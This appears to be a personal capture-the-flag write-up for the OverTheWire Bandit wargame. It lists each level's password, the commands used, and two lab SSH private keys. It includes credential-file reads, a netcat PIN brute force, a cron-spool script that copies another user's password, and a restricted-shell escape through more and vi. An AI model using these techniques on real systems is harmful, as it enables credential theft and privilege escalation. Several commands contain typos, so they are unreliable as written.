Blind CTF

im not using the hints


0. bandit0

    ls

    cat readme

1. NH2SXQwcBdpmTEzi3bvBHMM9H66vVXjL

    cat ./*

2. rRGizSaX8Mk1RTb1CNQoXTcYZWU6lgzi

    cat "spaces in this filename"

3. aBZ0W5EmUfAf7kHTQeOwd8bauFJ2lAiG 

    ls -a ./inhere
    cat ./inhere/.hidden

4. 2EW7BBsr6aMMoJ2HjW067dm8EgX26xNe

    ls -a ./inhere
    cat ./*
    There is a segment of the output that looks like a flag in the 7th file
    cat "./-file07"

5. lrIWWI6bB37kxfiCQZqUdOIYfr6eEeqR

    ls -a

    We have lots of files now too many to search by hand, we know the password is of length 32 so

    find . * -exec grep -E '\b.{32}\b'  {} \;

    This command will search each file in each of the subdirectories for a 32 character word.

6. P4L4vucdmLnm8I7Vl7jG1ApGSfjYKqJU

    There are no files in the home directory of bandit6 so we must try something else to locate the password file.

    We know the password is 32 characters and it is owned by both this user and the next bandit7.

    The command below will search allz files for a file matching these characteristics

    find / -user bandit7 -group bandit6 -exec grep -E '\b.{32}\b'  {} 2>/dev/null \;


7. z7WtoNQU2XfjmMtWA8u5rN4vzqu4v99S

    Opening the file in the home directory i can see its a large file containing 32 character strings

    The first thing that comes to mind is to brute force the list but that seems heavy handed and out of scope, im going to check the specification for this one.

    Ok, the specification says i need to find the flag next to the key 'millionth'.

    grep "millionth" ./data.txt

8. TESKZC0XvTetK0S9xNwm25STk5iWrBvP

    Again a list of 32 character strings is provided, this time without a key, 
    
    Another property of the flags is they tend to be unique strings.

    With that in mind ill try sorting and filtering out the duplicated lines.
    
    sort ./data.txt | uniq -u

    bingo

9. EN632PlfYiZbn3PhVK3XOGSlNInNE00t

    cat ./data.txt

    file -i ./data.txt
    
    Shows we have a binary file

    If we add the a switch to grep we can search it as if it were text for a 32 character string

    grep -aE '\b.{32}\b' 

10. G7w8LIi6J3kTb8A7j9LgrywtEUlyyp6s

    cat ./data.txt

    base64 -d ./data.txt
    

11. 6zPeziLdR2RKNdNYFNb6nVCKzphlXHBM

    cat ./data.txt

    Displayed is a string of characters with a structure identical the previous flag file, but the letters look scrambled. 

    I ran the text though a ceaser cipher brute script written in python.

        Shift 13: The password is JVNBBFSmZwKKOP0XbFXOoW8chDz5yVRv


12. JVNBBFSmZwKKOP0XbFXOoW8chDz5yVRv

    xxd -r data.txt data.gz

    gzip -d data.gz 

    xxd data

    bzip2 -d data

    xxd data.out

    mv data.out data.gz

    gzip -d data.gz

    xxd data

    file data

    mv data data.tar

    tar -xf data.tar

    xxd data5.bin

    tar -xf data5.bin

    xxd data6.bin

    bzip2 -d data6.bin

    xxd -data6.bin.out

    file data6.bin.out

    mv data6.bin.out data6.tar

    tar -xf data6.tar

    xxd data8.bin

    mv data8.bin data8.gz

    gzip -d data8.gz

    cat data8

13. wbWdlBxEir4CaE8LaPhauuOo6pwRmrDw

    ssh -i sshkey.private -p 2220 bandit14@localhost

    cat /etc/bandit_pass/bandit14 

14. fGrHPx402xGC7U7rXKDaxiWFTOiF0ENq

    nc localhost 30000

15. jN2kgmIXJ6fShzhT2avhotn4Zcka6tnt 

    openssl s_client -connect localhost:30001

    Then input jN2kgmIXJ6fShzhT2avhotn4Zcka6tnt - the password for the current stage

16. JQttfApK4SeyHwDlI9SXGR50qclOAil1

    nmap -p 31000-32000 --script ssl-enum-ciphers localhost

    31518, 31790

    openssh s_clinet -connect localhost:31518
    openssh s_clinet -connect localhost:31790

    -----BEGIN RSA PRIVATE KEY-----
    MIIEogIBAAKCAQEAvmOkuifmMg6HL2YPIOjon6iWfbp7c3jx34YkYWqUH57SUdyJ
    imZzeyGC0gtZPGujUSxiJSWI/oTqexh+cAMTSMlOJf7+BrJObArnxd9Y7YT2bRPQ
    Ja6Lzb558YW3FZl87ORiO+rW4LCDCNd2lUvLE/GL2GWyuKN0K5iCd5TbtJzEkQTu
    DSt2mcNn4rhAL+JFr56o4T6z8WWAW18BR6yGrMq7Q/kALHYW3OekePQAzL0VUYbW
    JGTi65CxbCnzc/w4+mqQyvmzpWtMAzJTzAzQxNbkR2MBGySxDLrjg0LWN6sK7wNX
    x0YVztz/zbIkPjfkU1jHS+9EbVNj+D1XFOJuaQIDAQABAoIBABagpxpM1aoLWfvD
    KHcj10nqcoBc4oE11aFYQwik7xfW+24pRNuDE6SFthOar69jp5RlLwD1NhPx3iBl
    J9nOM8OJ0VToum43UOS8YxF8WwhXriYGnc1sskbwpXOUDc9uX4+UESzH22P29ovd
    d8WErY0gPxun8pbJLmxkAtWNhpMvfe0050vk9TL5wqbu9AlbssgTcCXkMQnPw9nC
    YNN6DDP2lbcBrvgT9YCNL6C+ZKufD52yOQ9qOkwFTEQpjtF4uNtJom+asvlpmS8A
    vLY9r60wYSvmZhNqBUrj7lyCtXMIu1kkd4w7F77k+DjHoAXyxcUp1DGL51sOmama
    +TOWWgECgYEA8JtPxP0GRJ+IQkX262jM3dEIkza8ky5moIwUqYdsx0NxHgRRhORT
    8c8hAuRBb2G82so8vUHk/fur85OEfc9TncnCY2crpoqsghifKLxrLgtT+qDpfZnx
    SatLdt8GfQ85yA7hnWWJ2MxF3NaeSDm75Lsm+tBbAiyc9P2jGRNtMSkCgYEAypHd
    HCctNi/FwjulhttFx/rHYKhLidZDFYeiE/v45bN4yFm8x7R/b0iE7KaszX+Exdvt
    SghaTdcG0Knyw1bpJVyusavPzpaJMjdJ6tcFhVAbAjm7enCIvGCSx+X3l5SiWg0A
    R57hJglezIiVjv3aGwHwvlZvtszK6zV6oXFAu0ECgYAbjo46T4hyP5tJi93V5HDi
    Ttiek7xRVxUl+iU7rWkGAXFpMLFteQEsRr7PJ/lemmEY5eTDAFMLy9FL2m9oQWCg
    R8VdwSk8r9FGLS+9aKcV5PI/WEKlwgXinB3OhYimtiG2Cg5JCqIZFHxD6MjEGOiu
    L8ktHMPvodBwNsSBULpG0QKBgBAplTfC1HOnWiMGOU3KPwYWt0O6CdTkmJOmL8Ni
    blh9elyZ9FsGxsgtRBXRsqXuz7wtsQAgLHxbdLq/ZJQ7YfzOKU4ZxEnabvXnvWkU
    YOdjHdSOoKvDQNWu6ucyLRAWFuISeXw9a/9p7ftpxm0TSgyvmfLF2MIAEwyzRqaM
    77pBAoGAMmjmIJdjp+Ez8duyn3ieo36yrttF5NSsJLAbxFpdlc1gvtGCWW+9Cq0b
    dxviW8+TFVEBl1O4f7HVm6EpTscdDxU+bCXWkfjuRb7Dy9GOtt9JPsX8MBTakzh3
    vBgsyi/sN3RqRBcGU40fOoZyfAMT8s1m/uYv52O6IgeuZ/ujbjY=
    -----END RSA PRIVATE KEY-----

17. The above private key

    diff passwords.old passowrds.new

    hga5tuuCLF6fFzUpnagiMN8ssu9LFrdg
    
    glZreTEH1V3cGKL6g4conYqZqaEj0mte

18. hga5tuuCLF6fFzUpnagiMN8ssu9LFrdg

    ssh -f -p 2220 bandit18@bandit.labs.overthewire.org "cat readme"

19. awhqfNnAbc1naukrpqDYcF95h7HoMTrC

    files *

    xxd *

    readelf -a *

    ./bandit20-do cat /etc/bandit/bandit20

20. VxCazJaVykI6W36BkBU0mJTCM8rR95XT

    echo "VxCazJaVykI6W36BkBU0mJTCM8rR95XT" | nc -l 33333    

    tmux 

    ./suconnect 33333

    switch back to the fisrt tmux terminal and the flag has been sent to the listener

21. NvEJF7oVjkddltPSrdKEFOllh9V1IBcq

    ls /etc/cron.d

    cat /etc/cron.d/cronjob_bandit22

    /usr/bin/cronjob_bandit22.sh

    From here we get an error message:

    chmod: changing permissions of '/tmp/t7O6lds9S0RqQh9aMcz6ShpAoZKF7fgv': Operation not permitted
    /usr/bin/cronjob_bandit22.sh: line 3: /tmp/t7O6lds9S0RqQh9aMcz6ShpAoZKF7fgv: Permission denied

    cat /tmp/t7O6lds9S0RqQh9aMcz6ShpAoZKF7fgv

22. WdDozAdTM2z9DiFEQ2mGlwngMfj4EZff

    cat /etc/cron.d/cronjob_bandit23

    cat /usr/bin/cronjob_bandit23.sh

    echo "I am user bandit23" | md5sum | cut -d ' ' -f 1

    8ca319486bfbbc3663ea0fbe81326349

    /tmp/8ca319486bfbbc3663ea0fbe81326349

23. QYw0Y2aiA672PsMmh9puTQuhoz8SyR2G

    cat /etc/cron.d/cronjob_bandit24

        * * * * * bandit23 /usr/bin/cronjob_bandit23.sh  &> /dev/null
    
    cat /usr/bin/cronjob_bandit24.sh

        #!/bin/bash

        myname=$(whoami)

        cd /var/spool/$myname/foo || exit 1
        echo "Executing and deleting all scripts in /var/spool/$myname/foo:"
        for i in * .*;
        do
            if [ "$i" != "." -a "$i" != ".." ];
            then
                echo "Handling $i"
                owner="$(stat --format "%U" ./$i)"
                if [ "${owner}" = "bandit23" ]; then
                    timeout -s 9 60 ./$i
                fi
                rm -rf ./$i
            fi
        done

    echo -e '#!/bin/bash\n\ncat /etc/bandit_pass/bandit24 > /tmp/drongo/pass.txt' > /var/spool/bandit24/foo/script.sh && \
    chmod +rx /var/spool/bandit24/foo/script.sh && \
    chmod 777 /var/spool/bandit24/foo/script.sh

24. VAfGXJ1PBSsPSnvsjI8p759leLZ9GGar

    This one seemed simple at first but is a little trickier due to quirks with how netcat processes arguments and times requests

    First I created a temporary directory in /tmp and  created two files 

        touch ./pins.txt
        touch ./results.txt

        echo "$(seq -f "VAfGXJ1PBSsPSnvsjI8p759leLZ9GGar %04g" 9000 9999)" > ./pins.txt ; \
        echo "$( nc localhost 30002 < ./pins.txt )" | tee ./results.txt | grep -E '\w{32}' && echo "Flag found"

    It was here i encountered issues, the command finished early, too early to have tested all the values in the list. I tried using a shorter list of numbers, o to 1000, the script finishes successfully but of course, no flag is found, to solve this in one line i will need to rewrite this to batch the requests into groups of 1000. 
    I also encountered timeout errors for many requests so i checked the man for a some kind of input timeout and found the -w flag which sets the timeout for each request made.

    Below is a scripted implementation that i used to provide a more verbose output showing the pin being tested and the corresponding output.

        echo "" >  ./pins
        echo "" > ./results

        seq -f "VAfGXJ1PBSsPSnvsjI8p759leLZ9GGar %04g" 0 9999 > ./pins

        while read p; do
                echo $p | tee -a ./results
                results="$(echo $p | nc -w 1 localhost 30002 | tee -a ./results)"
                echo $results
                echo $results | grep -E '\w{32}' && break
        done <./pins

    We first create a sequence of numbers from 0 to 9999 that is padded to four characters we then use xargs to batch the sequence of pins into groups of 1000 prefixed with the password for the level. Tjis is because the recieving server has a timeout that closes the connection just after 
    The netcat command also has the -w flag to ensure that the server has time to read and respond to each request.
    Below is my single-pipe, one-line solution. it completes in about

         seq -w 0 9999 | xargs -P 1 -n 1000 -I {} echo "VAfGXJ1PBSsPSnvsjI8p759leLZ9GGar {}" | nc -w 1 localhost 30002 | grep -E '\w{32}' && echo "Flag found, exiting"


25. p7TaowMYrmu23Ol8hiZh9UvD0O9hpx8d

    Looking into the file system i find an ssh key for the next level

    -----BEGIN RSA PRIVATE KEY-----
    MIIEpQIBAAKCAQEApis2AuoooEqeYWamtwX2k5z9uU1Afl2F8VyXQqbv/LTrIwdW
    pTfaeRHXzr0Y0a5Oe3GB/+W2+PReif+bPZlzTY1XFwpk+DiHk1kmL0moEW8HJuT9
    /5XbnpjSzn0eEAfFax2OcopjrzVqdBJQerkj0puv3UXY07AskgkyD5XepwGAlJOG
    xZsMq1oZqQ0W29aBtfykuGie2bxroRjuAPrYM4o3MMmtlNE5fC4G9Ihq0eq73MDi
    1ze6d2jIGce873qxn308BA2qhRPJNEbnPev5gI+5tU+UxebW8KLbk0EhoXB953Ix
    3lgOIrT9Y6skRjsMSFmC6WN/O7ovu8QzGqxdywIDAQABAoIBAAaXoETtVT9GtpHW
    qLaKHgYtLEO1tOFOhInWyolyZgL4inuRRva3CIvVEWK6TcnDyIlNL4MfcerehwGi
    il4fQFvLR7E6UFcopvhJiSJHIcvPQ9FfNFR3dYcNOQ/IFvE73bEqMwSISPwiel6w
    e1DjF3C7jHaS1s9PJfWFN982aublL/yLbJP+ou3ifdljS7QzjWZA8NRiMwmBGPIh
    Yq8weR3jIVQl3ndEYxO7Cr/wXXebZwlP6CPZb67rBy0jg+366mxQbDZIwZYEaUME
    zY5izFclr/kKj4s7NTRkC76Yx+rTNP5+BX+JT+rgz5aoQq8ghMw43NYwxjXym/MX
    c8X8g0ECgYEA1crBUAR1gSkM+5mGjjoFLJKrFP+IhUHFh25qGI4Dcxxh1f3M53le
    wF1rkp5SJnHRFm9IW3gM1JoF0PQxI5aXHRGHphwPeKnsQ/xQBRWCeYpqTme9amJV
    tD3aDHkpIhYxkNxqol5gDCAt6tdFSxqPaNfdfsfaAOXiKGrQESUjIBcCgYEAxvmI
    2ROJsBXaiM4Iyg9hUpjZIn8TW2UlH76pojFG6/KBd1NcnW3fu0ZUU790wAu7QbbU
    i7pieeqCqSYcZsmkhnOvbdx54A6NNCR2btc+si6pDOe1jdsGdXISDRHFb9QxjZCj
    6xzWMNvb5n1yUb9w9nfN1PZzATfUsOV+Fy8CbG0CgYEAifkTLwfhqZyLk2huTSWm
    pzB0ltWfDpj22MNqVzR3h3d+sHLeJVjPzIe9396rF8KGdNsWsGlWpnJMZKDjgZsz
    JQBmMc6UMYRARVP1dIKANN4eY0FSHfEebHcqXLho0mXOUTXe37DWfZza5V9Oify3
    JquBd8uUptW1Ue41H4t/ErsCgYEArc5FYtF1QXIlfcDz3oUGz16itUZpgzlb71nd
    1cbTm8EupCwWR5I1j+IEQU+JTUQyI1nwWcnKwZI+5kBbKNJUu/mLsRyY/UXYxEZh
    ibrNklm94373kV1US/0DlZUDcQba7jz9Yp/C3dT/RlwoIw5mP3UxQCizFspNKOSe
    euPeaxUCgYEAntklXwBbokgdDup/u/3ms5Lb/bm22zDOCg2HrlWQCqKEkWkAO6R5
    /Wwyqhp/wTl8VXjxWo+W+DmewGdPHGQQ5fFdqgpuQpGUq24YZS8m66v5ANBwd76t
    IZdtF5HXs2S5CADTwniUS5mX1HO9l5gUkk+h0cH5JnPtsMCnAUM+BRY=
    -----END RSA PRIVATE KEY-----

    cat /etc/passwd
    cat /etc/passwd | grep bandit26
        
        bandit26:x:11026:11026:bandit level 26:/home/bandit26:/usr/bin/showtext
    
    cat /usr/bin/showtext

    Here we can see the shell is set to display a text file using the more program, and then close the connection.

    When we try to connect using

        ssh -i bandit26.sshkey bandit26@bandit.labs.overthewire.org -p 2220 -t /usr/bin/showtext

    Sure enough, the shell immediately exits. Taking a look at the man for more when in interactive mode it has the command v that can start vi editor. vi has interactive commands to view files and issue arbritrary commands. But how do we get more into interactive mode?
    if we make the terminal window smaller than the output of more it will have to enter interactive mode to allow scrollling. this is when we can press v to enter vi then
        :set shell=/bin/bash
    hit enter, then
        :shell
    you will now be in bash shell for bandit26
    from here you can simply 
        cat /etc/bandit_pass/bandit26
    to display the password


26. c7GvcKlw9mC7aUQaPx7nwFstuAIBw1o1
    To log into this challenge we must use the same lateral movement as the last stage, from more, through vi, into /bin/bash.

    When i open the file with cat it appears to be a binary, using file i can see its an ELF file
    
    Executing it we get some instructions that it will execute a command as another user
    
        ./bandit27-do cat /etc/bandit_pass/bandit27

27. YnQpBuifNMas1hcUFk70ZmqkhUU2EuaS

        mkdir /tmp/[tempfolder]

        cd /tmp/[tempfolder]

        git clone ssh://bandit27-git@127.0.0.1:2220/home/bandit27-git/repo

    This gives us a password prompt

    if we enter the password for this level the repo is cloned

        ls
        cd repo
        cat README

    And there it is.

28. AVanL161y9rsbcJIsFHuw35rjaOM19nR

    
    Same steps as before

        mkdir /tmp/[tempfolder]

        cd /tmp/[tempfolder]

        git clone ssh://bandit28-git@127.0.0.1:2220/home/bandit28-git/repo

    This gives us a password prompt

    if we enter the password for this level the repo is cloned

        ls
        cd repo
        cat README.md

    Its been redacted or "x'd" out

        git info

        git show [commit number]

    Here we can see the plaintext password that had been edited in the current commit.

29. tQKvmcwNYcFS6vmPHIUSI3ShmsrQZK8S

    Same steps as before

        mkdir /tmp/[tempfolder]

        cd /tmp/[tempfolder]

        git clone ssh://bandit29-git@127.0.0.1:2220/home/bandit29-git/repo

        ls
        cd repo
        cat README.md

    It says "no passwords in prod", maybe they are in dev then?
    swapping to the dev branch
    
        git checkout remotes/origin/dev

    perform a quick search of the branch for a 32 character phrase

        git grep -E "\w{32}" $(git rev-list --all)

    bingo.

30. xbhV3HpNGlTIdnjUrdAlPzc2L6y9EOnS

    Same steps as before

        mkdir /tmp/[tempfolder]

        cd /tmp/[tempfolder]

        git clone ssh://bandit30-git@127.0.0.1:2220/home/bandit30-git/repo
    
    Enter the password for this level
    
        ls
        cd repo
        cat README.md

    README.md is a blank file.
    
        git branch
    
    Shows only one branch

    perform a quick search of the branch for a 32 character phrase

        git grep -E "\w{32}" $(git rev-list --all)
    
    Nothing.

    Time to check the tags for anything

        git tag
    
    reveals a tag called secret

        git show secret
    
    gotcha, this has revealde the flag for the next stage.

31. OoffzGDlzhAlerFJ2cAiz1D41JW1Mhmt

        ls
        cd repo
        cat README.md

    It contains a specification for the task

        This time your task is to push a file to the remote repository.

        Details:
        File name: key.txt
        Content: 'May I come in?'
        Branch: master

    To push to the repo ill need to check the .gitignore for wildcards or other roadblocks

        cat .gitignore
    
    I find that there is a wildcard for .txt files

        echo "" > .gitignore
        echo "May I come in?" > key.txt
        git add .
        git commit -m ""
        git push
    
    Then enter the password for the level again

    In the pre-commit hook messege you will see the key.

32. rmCBvG56y58BXzv98yZGdO7ATVL5dW8y

    To break out of the uppershell we are going to need to use $0, its the only non-lowercase command that can drop us into a shell.

        ls -al 

    Shows that uppershell is run as bandit33? could i inject something here?

        whoami

    Surprisingly i am logged in as bandit33

    cat /etc/bandit_pass/bandit33
    
33. odHo63fHiFqcWWJG9rLiLDtPm45KzUKy

    This level congratulates you on completion of bandit.